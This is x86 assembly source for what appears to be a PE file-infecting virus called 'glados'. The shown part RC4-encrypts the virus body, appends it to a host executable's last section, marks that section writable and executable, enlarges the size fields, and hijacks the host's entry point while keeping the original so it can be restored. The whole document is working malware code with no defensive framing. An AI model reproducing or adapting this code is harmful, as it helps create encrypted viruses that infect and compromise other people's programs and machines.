        xor     ecx, dword ptr [ebp + eax * 4]
        mov     dword ptr [ebp + eax * 4], ecx
        mov     byte ptr [ebp + (offset index - offset state) - 1], al
        xchg    ecx, eax
        stos    dword ptr [edi]
        pop     ecx
        loop    store_dword
        pop     edi

;-------------------------------------------------------------------------------
;initialize RC4 state and key scheduling algorithm
;-------------------------------------------------------------------------------

        add     ebp, offset glados_end - offset state
        xor     eax, eax

init_state      label    near
        mov     byte ptr [ebp + eax], al
        inc     al
        jnz     init_state
        xor     ebx, ebx
        cdq

swap_values     label    near
        mov     bl, al
        and     bl, RC4KEYSIZE - 1
        add     dl, byte ptr [edi + ebx]
        mov     bl, byte ptr [ebp + eax]
        add     dl, bl
        xchg    byte ptr [ebp + edx], bl
        mov     byte ptr [ebp + eax], bl
        inc     al
        jnz     swap_values
        mov     dx,  offset glados_end - offset skip_keys
        mov     ebx, eax
        add     edi, 10h                     ;four cmpsd in a row is too ugly
        add     esi, 10h

;-------------------------------------------------------------------------------
;encrypt code
;-------------------------------------------------------------------------------

generate        label    near
        push    edx
        inc     al
        mov     dl, byte ptr [ebp + eax]
        mov     cl, dl
        add     bl, dl
        xchg    byte ptr [ebp + ebx], dl
        mov     byte ptr [ebp + eax], dl
        add     cl, dl
        mov     cl, byte ptr [ebp + ecx]
        xor     cl, byte ptr [esi]
        mov     byte ptr [edi], cl
        inc     edi
        inc     esi
        pop     edx
        dec     edx
        jnz     generate

;-------------------------------------------------------------------------------
;if the code fits physically, then we make sure it fits virtually too
;-------------------------------------------------------------------------------

        pop     esi
        pop     eax
        mov     dh, 10h
        add     dword ptr [esi - sizeof IMAGE_SECTION_HEADER.Misc.VirtualSize], edx
        add     dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], edx 

;-------------------------------------------------------------------------------
;clear *_NX_COMPAT above, then might not need IMAGE_SCN_MEM_EXECUTE in section flags
;-------------------------------------------------------------------------------

        or      byte ptr [esi + (IMAGE_SECTION_HEADER.Characteristics - IMAGE_SECTION_HEADER.VirtualAddress) + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h

;-------------------------------------------------------------------------------
;alter entrypoint 
;-------------------------------------------------------------------------------

        pop     edi
        pop     ecx
        xchg    dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], ecx
        mov     dword ptr [edi + (offset glados_pushrva - offset glados_exe) - 4], ecx
        mov     byte ptr [edi + (offset pathinst_patch - offset glados_exe)], 41h
        int     3

glados_end      label    near

staterc4        label    near

state_index     = 0

repeat  256
        db state_index
        state_index = state_index + 1
endm

end     init_glados